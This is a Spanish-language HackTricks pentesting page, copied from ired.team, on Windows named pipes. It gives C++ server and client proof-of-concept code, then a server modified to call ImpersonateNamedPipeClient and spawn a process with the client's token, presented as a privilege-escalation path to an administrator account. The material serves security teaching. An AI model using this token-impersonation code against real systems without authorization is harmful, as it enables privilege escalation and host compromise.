# Impersonación de Cliente de Tubería con Nombre

## Impersonación de Cliente de Tubería con Nombre

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* Consigue el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Esta información fue copiada de** [**https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation**](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)

## Descripción general

Una `tubería` es un bloque de memoria compartida que los procesos pueden usar para comunicarse e intercambiar datos.

`Tuberías con nombre` es un mecanismo de Windows que permite a dos procesos no relacionados intercambiar datos entre sí, incluso si los procesos se encuentran en dos redes diferentes. Es muy similar a la arquitectura cliente/servidor, ya que existen nociones como `un servidor de tubería con nombre` y un `cliente de tubería con nombre`.

Un servidor de tubería con nombre puede abrir una tubería con nombre con un nombre predefinido y luego un cliente de tubería con nombre puede conectarse a esa tubería a través del nombre conocido. Una vez establecida la conexión, puede comenzar el intercambio de datos.

Este laboratorio se refiere a un código PoC simple que permite:

* crear un servidor de tubería con nombre tonto de un solo subproceso que aceptará una conexión de cliente
* servidor de tubería con nombre para escribir un mensaje simple en la tubería con nombre para que el cliente de la tubería pueda leerlo

## Código

A continuación se muestra el PoC tanto para el servidor como para el cliente:

{% tabs %}
{% tab title="namedPipeServer.cpp" %}
```cpp
#include "pch.h"
#include <Windows.h>
#include <iostream>

int main() {
	LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
	LPVOID pipeBuffer = NULL;
	HANDLE serverPipe;
	DWORD readBytes = 0;
	DWORD readBuffer = 0;
	int err = 0;
	BOOL isPipeConnected;
	BOOL isPipeOpen;
	wchar_t message[] = L"HELL";
	DWORD messageLenght = lstrlen(message) * 2;
	DWORD bytesWritten = 0;

	std::wcout << "Creating named pipe " << pipeName << std::endl;
	serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);
	
	isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
	if (isPipeConnected) {
		std::wcout << "Incoming connection to " << pipeName << std::endl;
	}
	
	std::wcout << "Sending message: " << message << std::endl;
	WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);
	
	return 0;
}
```
{% endtab %}

{% tab title="namedPipeClient.cpp" %}

```cpp
#include <windows.h>
#include <stdio.h>
#include <tchar.h>

#define BUFSIZE 512

int _tmain(int argc, TCHAR *argv[])
{
   HANDLE hPipe;
   LPTSTR lpvMessage=TEXT("Default message from client.");
   TCHAR chBuf[BUFSIZE];
   BOOL fSuccess = FALSE;
   DWORD cbRead, cbToWrite, cbWritten, dwMode;
   LPTSTR lpszPipename = TEXT("\\\\.\\pipe\\mynamedpipe");

   if( argc > 1 )
      lpvMessage = argv[1];

   // Try to open a named pipe; wait for it, if necessary.

   while (1)
   {
      hPipe = CreateFile(
         lpszPipename,   // pipe name
         GENERIC_READ |  // read and write access
         GENERIC_WRITE,
         0,              // no sharing
         NULL,           // default security attributes
         OPEN_EXISTING,  // opens existing pipe
         0,              // default attributes
         NULL);          // no template file

      // Break if the pipe handle is valid.

      if (hPipe != INVALID_HANDLE_VALUE)
         break;

      // Exit if an error other than ERROR_PIPE_BUSY occurs.

      if (GetLastError() != ERROR_PIPE_BUSY)
      {
         _tprintf( TEXT("Could not open pipe. GLE=%d\n"), GetLastError() );
         return -1;
      }

      // All pipe instances are busy, so wait for 20 seconds.

      if ( ! WaitNamedPipe(lpszPipename, 20000))
      {
         printf("Could not open pipe: 20 second wait timed out.");
         return -1;
      }
   }

   // The pipe connected; change to message-read mode.

   dwMode = PIPE_READMODE_MESSAGE;
   fSuccess = SetNamedPipeHandleState(
      hPipe,    // pipe handle
      &dwMode,  // new pipe mode
      NULL,     // don't set maximum bytes
      NULL);    // don't set maximum time

   if ( ! fSuccess)
   {
      _tprintf( TEXT("SetNamedPipeHandleState failed. GLE=%d\n"), GetLastError() );
      return -1;
   }

   // Send a message to the pipe server.

   cbToWrite = (lstrlen(lpvMessage)+1)*sizeof(TCHAR);
   _tprintf( TEXT("Sending %d byte message: \"%s\"\n"), cbToWrite, lpvMessage);

   fSuccess = WriteFile(
      hPipe,                  // pipe handle
      lpvMessage,             // message
      cbToWrite,              // message length
      &cbWritten,             // bytes written
      NULL);                  // not overlapped

   if ( ! fSuccess)
   {
      _tprintf( TEXT("WriteFile to pipe failed. GLE=%d\n"), GetLastError() );
      return -1;
   }

   printf("\nMessage sent to server, receiving reply as follows:\n");

   do
   {
      // Read from the pipe.

      fSuccess = ReadFile(
         hPipe,    // pipe handle
         chBuf,    // buffer to receive reply
         BUFSIZE*sizeof(TCHAR),  // size of buffer
         &cbRead,  // number of bytes read
         NULL);    // not overlapped

      if ( ! fSuccess && GetLastError() != ERROR_MORE_DATA )
         break;

      _tprintf( TEXT("\"%s\"\n"), chBuf );
   } while ( ! fSuccess);  // repeat loop if ERROR_MORE_DATA

   if ( ! fSuccess)
   {
      _tprintf( TEXT("ReadFile from pipe failed. GLE=%d\n"), GetLastError() );
      return -1;
   }

   _tprintf( TEXT("\n<End of message, press ENTER to terminate connection and exit>") );
   _getch();

   CloseHandle(hPipe);

   return 0;
}
```

{% endtab %}

{% tab title="namedPipeClient.cpp" %}

```cpp
#include <windows.h>
#include <stdio.h>
#include <tchar.h>

#define BUFSIZE 512

int _tmain(int argc, TCHAR *argv[])
{
   HANDLE hPipe;
   LPTSTR lpvMessage=TEXT("Mensaje predeterminado del cliente.");
   TCHAR chBuf[BUFSIZE];
   BOOL fSuccess = FALSE;
   DWORD cbRead, cbToWrite, cbWritten, dwMode;
   LPTSTR lpszPipename = TEXT("\\\\.\\pipe\\mynamedpipe");

   if( argc > 1 )
      lpvMessage = argv[1];

   // Intenta abrir un named pipe; espera si es necesario.

   while (1)
   {
      hPipe = CreateFile(
         lpszPipename,   // nombre del pipe
         GENERIC_READ |  // acceso de lectura y escritura
         GENERIC_WRITE,
         0,              // sin compartir
         NULL,           // atributos de seguridad predeterminados
         OPEN_EXISTING,  // abre el pipe existente
         0,              // atributos predeterminados
         NULL);          // sin archivo de plantilla

      // Rompe si el handle del pipe es válido.

      if (hPipe != INVALID_HANDLE_VALUE)
         break;

      // Salir si ocurre un error que no sea ERROR_PIPE_BUSY.

      if (GetLastError() != ERROR_PIPE_BUSY)
      {
         _tprintf( TEXT("No se pudo abrir el pipe. GLE=%d\n"), GetLastError() );
         return -1;
      }

      // Todas las instancias del pipe están ocupadas, así que espera 20 segundos.

      if ( ! WaitNamedPipe(lpszPipename, 20000))
      {
         printf("No se pudo abrir el pipe: tiempo de espera de 20 segundos agotado.");
         return -1;
      }
   }

   // El pipe se conectó; cambia al modo de lectura de mensajes.

   dwMode = PIPE_READMODE_MESSAGE;
   fSuccess = SetNamedPipeHandleState(
      hPipe,    // handle del pipe
      &dwMode,  // nuevo modo de pipe
      NULL,     // no establecer bytes máximos
      NULL);    // no establecer tiempo máximo

   if ( ! fSuccess)
   {
      _tprintf( TEXT("SetNamedPipeHandleState falló. GLE=%d\n"), GetLastError() );
      return -1;
   }

   // Envía un mensaje al servidor de pipe.

   cbToWrite = (lstrlen(lpvMessage)+1)*sizeof(TCHAR);
   _tprintf( TEXT("Enviando mensaje de %d bytes: \"%s\"\n"), cbToWrite, lpvMessage);

   fSuccess = WriteFile(
      hPipe,                  // handle del pipe
      lpvMessage,             // mensaje
      cbToWrite,              // longitud del mensaje
      &cbWritten,             // bytes escritos
      NULL);                  // no superpuesto

   if ( ! fSuccess)
   {
      _tprintf( TEXT("WriteFile al pipe falló. GLE=%d\n"), GetLastError() );
      return -1;
   }

   printf("\nMensaje enviado al servidor, recibiendo respuesta como sigue:\n");

   do
   {
      // Lee del pipe.

      fSuccess = ReadFile(
         hPipe,    // handle del pipe
         chBuf,    // búfer para recibir respuesta
         BUFSIZE*sizeof(TCHAR),  // tamaño del búfer
         &cbRead,  // número de bytes leídos
         NULL);    // no superpuesto

      if ( ! fSuccess && GetLastError() != ERROR_MORE_DATA )
         break;

      _tprintf( TEXT("\"%s\"\n"), chBuf );
   } while ( ! fSuccess);  // repite el bucle si ERROR_MORE_DATA

   if ( ! fSuccess)
   {
      _tprintf( TEXT("ReadFile del pipe falló. GLE=%d\n"), GetLastError() );
      return -1;
   }

   _tprintf( TEXT("\n<Fin del mensaje, presione ENTER para terminar la conexión y salir>") );
   _getch();

   CloseHandle(hPipe);

   return 0;
}
```

{% endtab %}
```cpp
#include "pch.h"
#include <iostream>
#include <Windows.h>

const int MESSAGE_SIZE = 512;

int main()
{
	LPCWSTR pipeName = L"\\\\10.0.0.7\\pipe\\mantvydas-first-pipe";
	HANDLE clientPipe = NULL;
	BOOL isPipeRead = true;
	wchar_t message[MESSAGE_SIZE] = { 0 };
	DWORD bytesRead = 0;

	std::wcout << "Connecting to " << pipeName << std::endl;
	clientPipe = CreateFile(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	
	while (isPipeRead) {
		isPipeRead = ReadFile(clientPipe, &message, MESSAGE_SIZE, &bytesRead, NULL);
		std::wcout << "Received message: " << message;
	}

	return 0;
}
```
{% endtab %}
{% endtabs %}

## Ejecución

A continuación se muestra el servidor de named pipe y el cliente de named pipe funcionando como se esperaba:

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22.png>)

Vale la pena señalar que la comunicación de named pipes por defecto utiliza el protocolo SMB:

![](<../../.gitbook/assets/Screenshot from 2019-04-04 23-51-48.png>)

Comprobando cómo el proceso mantiene un identificador para nuestro named pipe `mantvydas-first-pipe`:

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (1).png>)

De manera similar, podemos ver que el cliente tiene un identificador abierto para el named pipe:

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (2).png>)

Incluso podemos ver nuestro pipe con powershell:
```csharp
((Get-ChildItem \\.\pipe\).name)[-1..-5]
```
![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (3).png>)

## Impersonación de Token

{% hint style="info" %}
Tenga en cuenta que para poder suplantar el token del proceso del cliente, es necesario que el proceso del servidor que crea la tubería tenga el privilegio de token **`SeImpersonate`**.
{% endhint %}

Es posible que el servidor de la tubería con nombre suplante el contexto de seguridad del cliente de la tubería con nombre mediante una llamada de API `ImpersonateNamedPipeClient`, lo que a su vez cambia el token del subproceso actual del servidor de la tubería con nombre por el token del cliente de la tubería con nombre.

Podemos actualizar el código del servidor de la tubería con nombre de esta manera para lograr la suplantación, tenga en cuenta que las modificaciones se ven en la línea 25 y siguientes:
```cpp
int main() {
	LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
	LPVOID pipeBuffer = NULL;
	HANDLE serverPipe;
	DWORD readBytes = 0;
	DWORD readBuffer = 0;
	int err = 0;
	BOOL isPipeConnected;
	BOOL isPipeOpen;
	wchar_t message[] = L"HELL";
	DWORD messageLenght = lstrlen(message) * 2;
	DWORD bytesWritten = 0;

	std::wcout << "Creating named pipe " << pipeName << std::endl;
	serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);
	
	isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
	if (isPipeConnected) {
		std::wcout << "Incoming connection to " << pipeName << std::endl;
	}
	
	std::wcout << "Sending message: " << message << std::endl;
	WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);
	
	std::wcout << "Impersonating the client..." << std::endl;
	ImpersonateNamedPipeClient(serverPipe);
	err = GetLastError();	

	STARTUPINFO	si = {};
	wchar_t command[] = L"C:\\Windows\\system32\\notepad.exe";
	PROCESS_INFORMATION pi = {};
	HANDLE threadToken = GetCurrentThreadToken();
	CreateProcessWithTokenW(threadToken, LOGON_WITH_PROFILE, command, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

	return 0;
}
```
Al ejecutar el servidor y conectarse a él con el cliente que se está ejecutando bajo el contexto de seguridad administrator@offense.local, podemos ver que el hilo principal del servidor de tuberías con nombre asumió el token del cliente de la tubería con nombre - offense\administrator, aunque el PipeServer.exe en sí se está ejecutando bajo el contexto de seguridad ws01\mantvydas. ¿Suena como una buena manera de escalar privilegios?
